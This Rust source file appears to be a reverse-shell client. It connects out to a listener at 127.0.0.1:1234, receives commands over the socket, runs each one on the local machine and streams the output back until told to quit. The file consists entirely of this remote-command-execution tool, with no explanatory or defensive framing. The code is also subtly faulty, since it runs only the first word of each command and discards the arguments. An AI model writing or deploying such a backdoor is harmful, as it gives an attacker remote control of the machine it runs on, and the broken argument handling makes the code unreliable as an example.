use std::net::{AddrParseError, Ipv4Addr, Shutdown, SocketAddrV4, TcpListener, TcpStream};
use std::process::{exit, Command, Output};
use std::io::{self, BufRead, BufReader, Read, Write};

fn executecmd(cmd:&str) -> String{
    // let temp: String = "/c".to_owned();
    let fullcmd =  cmd.trim_end_matches('\n');

    let cmds: Vec<&str> = fullcmd.split(" ").collect();

    println!("{:#?}", cmds);
    let result  = Command::new(&cmds[0]).output().unwrap();

    let stdout = String::from_utf8_lossy(result.stdout.as_slice());
    let stderr = String::from_utf8_lossy(result.stderr.as_slice());

    if stdout.len() > 0 {
        return stdout.to_string();
    }else {
        return stderr.to_string();
    }
}

fn main() {

    let mut client = TcpStream::connect("127.0.0.1:1234").unwrap();
    println!("Connected to: {}", client.peer_addr().unwrap());

    loop{

        let mut buffer:Vec<u8> = Vec::new();
        let mut reader = BufReader::new(&client);
        reader.read_until(b'\0', &mut buffer).unwrap();

        println!("Received from server: {}", String::from_utf8_lossy(&buffer).trim());

        if buffer.len() == 0 || String::from_utf8_lossy(&buffer).trim_end_matches('\0') == "quit"{
            break;
        }
        
        let mut output = executecmd(String::from_utf8_lossy(&buffer).trim_end_matches('\0'));
        output.push('\0');
        client.write(&mut output.as_bytes()).unwrap();

    }
    client.shutdown(Shutdown::Both).unwrap();
}
